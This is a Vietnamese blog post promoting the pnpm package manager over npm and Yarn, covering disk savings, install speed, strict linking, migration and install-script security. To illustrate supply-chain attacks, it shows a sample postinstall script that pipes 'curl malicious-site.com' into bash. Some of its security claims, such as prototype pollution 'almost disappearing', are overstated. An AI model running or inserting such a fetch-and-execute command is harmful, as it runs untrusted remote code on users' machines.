---
title: "PNPM – Khi Dev Không Cần Phải Chờ NPM “đi chợ” Giúp Mình Nữa"
description: "Khi thời gian cài đặt lâu như mẹ “đi chợ”, đã đến lúc để pnpm cáng đáng nhiệm vụ!"
pubDate: "2025-10-29"
published: true
tags: ["pnpm", "npm", "tooling", "package manager"]
slug: "pnpm-khi-dev-khong-can-cho-npm-di-cho-giup-minh-nua"
author: "Hien Nguyen"
ogTitle: "PNPM – Khi Dev Không Cần Phải Chờ NPM đi chợ Giúp Mình Nữa"
ogDescription: "Khi thời gian cài đặt lâu như mẹ “đi chợ”, đã đến lúc để pnpm cáng đáng nhiệm vụ!"
pairSlug:
  en: "pnpm-when-devs-stop-waiting-for-npm"
---

# ⚡ PNPM – Khi Dev Không Cần Phải Chờ NPM “Đi Chợ” Nữa

> “npm install” mà quạt CPU gào rú, disk sắp nổ tung — thì đã đến lúc bạn thử **pnpm**.

---

## 🧩 Câu Chuyện Quen Thuộc

Bạn clone một repo, chạy lệnh:

```bash
npm install
```

Và rồi... chờ.  
Chờ mãi.  
Chờ hoài.

Rồi bạn thử **Yarn**, thấy nhanh hơn tí, nhưng vẫn phải tải cùng một package 10 lần cho 10 dự án khác nhau.  
Ổ cứng ngày càng phình to, thư mục `node_modules` nặng cả GB, và CI thì chạy chậm như rùa bò.

Đó là bức tranh trước khi **pnpm** xuất hiện.

---

## 🚀 PNPM Khác Biệt Như Thế Nào Với NPM Và Yarn?

Tóm gọn: **pnpm sử dụng cách lưu dependency hoàn toàn khác biệt.**

| Cơ Chế          | NPM / Yarn                            | PNPM                                                                    |
| --------------- | ------------------------------------- | ----------------------------------------------------------------------- |
| Cách Lưu        | Copy riêng package cho từng dự án     | Sử dụng **global content-addressable store**, chỉ **symlink** vào dự án |
| Dung Lượng Disk | Nặng, lặp dữ liệu                     | Rất nhẹ, tiết kiệm ổ cứng                                               |
| Tốc Độ Cài Đặt  | Bình thường                           | **Nhanh hơn 2–3 lần** (nhờ cache + hard link)                           |
| Quản Lý Version | Theo từng dự án                       | Siêu chính xác nhờ **strict symlink resolution**                        |
| Bảo Mật Script  | **Tự động chạy `postinstall` script** | **Không tự động chạy trừ khi explicit**                                 |

---

## 🔒 Bảo Mật – Điểm Làm PNPM Thực Sự “Đáng Tiền”

Đây là phần mà nhiều dev **chưa chú ý nhưng cực kỳ quan trọng**.

### ❌ Vấn Đề Của NPM/Yarn:

Khi chạy `npm install` hoặc `yarn install`,  
các package có thể **tự động chạy script** như:

```json
"scripts": {
  "postinstall": "curl malicious-site.com | bash"
}
```

Nếu không kiểm soát kỹ hoặc CI không sandbox, bạn vừa mở cửa cho mã độc chạy trên máy mình. Gần đây, các vụ lừa đảo kiểu này diễn ra thường xuyên: dev pull source Node.js từ repo lạ (thường qua bài test hoặc bài tập), chạy `npm i` là "toang" – mã độc tự chạy, quét env variables để steal API keys, GitHub tokens, AWS credentials, thậm chí lan truyền như worm. Ví dụ, tháng 9/2025, một loạt package phổ biến như chalk, debug bị compromise, dẫn đến hàng trăm package khác bị nhiễm, đánh cắp credentials từ môi trường dev. Worm "Shai-Hulud" đã tự replicate, ảnh hưởng hàng triệu install, khiến bao nhiêu key và tài khoản bay màu chỉ vì scripts auto-run. Đây là **vector tấn công phổ biến** (supply chain attack), đặc biệt với dev mới hoặc team không audit dependencies.

### ✅ PNPM Xử Lý Thông Minh Hơn:

- **Không tự động chạy script**, trừ khi bạn **explicitly cho phép**.
- Có thể bật `--ignore-scripts` mặc định trong `.npmrc`:
  ```bash
  pnpm install --ignore-scripts
  ```
- Giúp **ngăn chặn code độc hại** từ dependency bên thứ ba ngay từ đầu – pull repo lạ về, chạy `pnpm i` thì mã độc nằm im, không steal keys hay lan truyền.
- Ngoài ra, pnpm sandbox hóa `node_modules`, hạn chế **module A override module B** — các kiểu tấn công như _prototype pollution_ hay _dependency shadowing_ gần như biến mất.

> 🧠 Nói cách khác: pnpm cài package, nhưng không “tin tưởng mù quáng” package đó – lý tưởng để tránh những vụ "toang" tài khoản gần đây.

---

## 🧠 Tư Duy Thiết Kế Khác Biệt

### 1️⃣ “Global Store” – Ổ Đĩa Thông Minh

PNPM có một nơi lưu trữ toàn cục (mặc định: `~/.pnpm-store`).  
Mỗi package chỉ tồn tại **một bản duy nhất** — các dự án chỉ “link” tới đó.

```bash
# Lần đầu
pnpm install

# Lần sau (với dự án khác)
pnpm install   # Gần như tức thì, vì package đã có sẵn
```

### 2️⃣ “Strict Linking” – Không Để Dependency Tràn Lan

PNPM tạo `node_modules` theo cấu trúc “virtual store” riêng:  
Dependency chỉ access được những gì khai báo trong `package.json`.  
Điều này giúp:

- Tránh lỗi “hidden dependency” (import module không khai báo).
- Build reproducible, CI không lo “chạy tốt trên máy A, fail trên máy B”.

---

## 🧰 Migration Nhanh Gọn

Nếu dự án đang dùng NPM/Yarn:

```bash
npm install -g pnpm
# Hoặc dùng corepack (Node 18+)
corepack enable pnpm
```

Chuyển sang dùng:

```bash
pnpm install
pnpm run dev
```

Tất cả script và config vẫn hoạt động bình thường.  
Bạn sẽ thấy tốc độ khác biệt ngay từ lần đầu.

---

## ⚖️ Khi Nào Chưa Cần Vội Chuyển Sang PNPM?

- Team đang dùng **workspace Yarn 1 + custom plugin** — cần test kỹ.
- Hệ thống CI/CD cũ chưa hỗ trợ pnpm cache.
- Một số tool (hiếm) vẫn assume cấu trúc `node_modules` truyền thống.

Tuy nhiên, với **Node 18+ và corepack**, việc dùng pnpm giờ đã cực kỳ mượt mà.  
Cả Vercel, Turborepo, NX, Cloudflare Workers đều hỗ trợ sẵn.

---

## 💬 Tổng Kết

|                 | NPM               | Yarn         | PNPM                                |
| --------------- | ----------------- | ------------ | ----------------------------------- |
| Tốc Độ          | 🐢                | ⚡           | 🚀                                  |
| Dung Lượng Disk | Nặng              | Trung bình   | Rất nhẹ                             |
| An Toàn Script  | Chạy tự động      | Chạy tự động | **Không auto-run**                  |
| Cache Toàn Cục  | ❌                | ✅ (partial) | ✅ (full)                           |
| Isolation       | Thấp              | Trung bình   | **Cao (symlink isolation)**         |
| Phù Hợp Với     | Mọi dự án nhỏ/lớn | Trung bình   | **Dev chuyên nghiệp / CI hiện đại** |

---

## 🔗 Tài Liệu Chính Thức

- [pnpm.io](https://pnpm.io)
- [Cấu trúc store của pnpm](https://pnpm.io/symlinked-node-modules-structure)
- [Corepack & pnpm setup](https://nodejs.org/api/corepack.html)

---

✍️ _Viết bởi một dev từng thấy `node_modules` nặng hơn cả source code.  
Giờ ổ cứng sạch sẽ, build nhanh chóng, CI êm ru – nhờ pnpm._
